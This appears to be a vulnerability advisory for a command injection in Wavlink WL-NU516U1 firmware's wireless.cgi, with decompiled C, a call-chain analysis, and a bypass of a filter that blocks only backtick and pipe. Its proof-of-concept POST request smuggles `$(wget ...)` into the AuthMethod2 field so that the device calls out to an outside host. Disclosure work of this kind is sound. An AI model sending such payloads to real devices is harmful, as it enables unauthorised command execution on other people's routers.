# WL-NU516U1 wireless.cgi multi_ssid AuthMethod2 Command Injection

Vendor: Wavlink

Product: WL-NU516U1

Version: M16U1_V240425
Firmware Download: https://docs.wavlink.xyz/Firmware/?category=USB+Printer+Server&model=WL-NU516U1-A

Vulnerability: Command Injection

CVE: TBD

## Affected version

Wavlink WL-NU516U1 M16U1_V240425

## Vulnerability details

Wavlink WL-NU516U1 M16U1_V240425 contains a command injection vulnerability in /cgi-bin/wireless.cgi.

When the `page` parameter is set to `multi_ssid`, the function `sub_401D68` is invoked.

The function reads `AuthMethod2` from POST data and concatenates it into shell commands:

```c
sprintf(v29, "set_bss.sh set 2 \"%s_Touch\" %s %s Admin12345", v30, v_authmethod, v_encryptype);
system(v29);
sprintf(v29, "set_bss.sh set 6 \"%s_Touch\" %s %s Admin12345", v30, v_authmethod, v_encryptype);
system(v29);
```

The input filter `sub_4074A0` only blocks backtick and pipe. The `$(cmd)` syntax bypasses the filter.

## Binary Analysis

### Call Chain

```
ftext (main router)
  → sub_401D68 (multi_ssid handler)
    → sub_405EA8 (URL decode, reads AuthMethod2 POST parameter)
    → sub_4074A0 (input filter, blocks ` and | only)
    → sprintf (concatenates into shell command)
    → system() (executes command)
```

### Key Functions

**sub_401D68 (multi_ssid handler):**
- Reads multiple POST parameters via `sub_405EA8`:
  - `SSID2G2` → variable `v8`
  - `AuthMethod2` → variable `v_authmethod`
  - `EncrypType2` → variable `v_encryptype`
  - `WPAPSK12` → variable `v_wpapsk`
- Constructs shell commands using sprintf and executes via system()

**sub_4074A0 (input filter):**
- Iterates through each character of the input string
- Blocks character if ASCII value is 96 (backtick `` ` ``) or 124 (pipe `|`)
- Does NOT block: `$`, `(`, `)`, `;`, `&`

### Vulnerability Flow

1. User sends POST request with `page=multi_ssid&wifi_multi_ssid=1&SSID2G2=TestSSID&AuthMethod2=$(wget http://attacker:6666/callback)&EncrypType2=NONE`
2. `sub_401D68` reads `AuthMethod2` → `$(wget http://attacker:6666/callback)`
3. `sub_4074A0` checks each character: `$`, `(`, `w`, `g`, `e`, `t`, ... none are blocked
4. sprintf constructs: `set_bss.sh set 2 "TestSSID_Touch" $(wget http://attacker:6666/callback) NONE Admin12345`
5. `system()` executes the command, shell interprets `$(wget ...)` as command substitution
6. `wget` connects to attacker's server, confirming command execution

### Command Construction

The AuthMethod value is used in the sprintf call:
```c
sprintf(v29, "set_bss.sh set 2 \"%s_Touch\" %s %s Admin12345", 
        v30,           // SSID with _Touch suffix
        v_authmethod,  // AuthMethod2 (user-controlled)
        v_encryptype); // EncrypType2
system(v29);
```

The AuthMethod2 value replaces the `OPEN` placeholder in the command.

## Proof of Concept (PoC)

```http
POST /cgi-bin/wireless.cgi HTTP/1.1
Host: 192.168.6.3
Content-Type: application/x-www-form-urlencoded
Referer: http://192.168.6.3/
Connection: close
Content-Length: 112

page=multi_ssid&wifi_multi_ssid=1&SSID2G2=TestSSID&AuthMethod2=$(wget http://192.168.6.1:6666/auth2)&EncrypType2=NONE
```

**Verification:** Monitor receives `GET /auth2` from device IP, confirming command execution.

## Root Cause Summary

The root cause is the combination of:
1. No sanitization of user input before shell command construction
2. Incomplete input filter that only blocks backtick and pipe, missing `$()` command substitution
3. Direct use of `system()` with user-controlled string
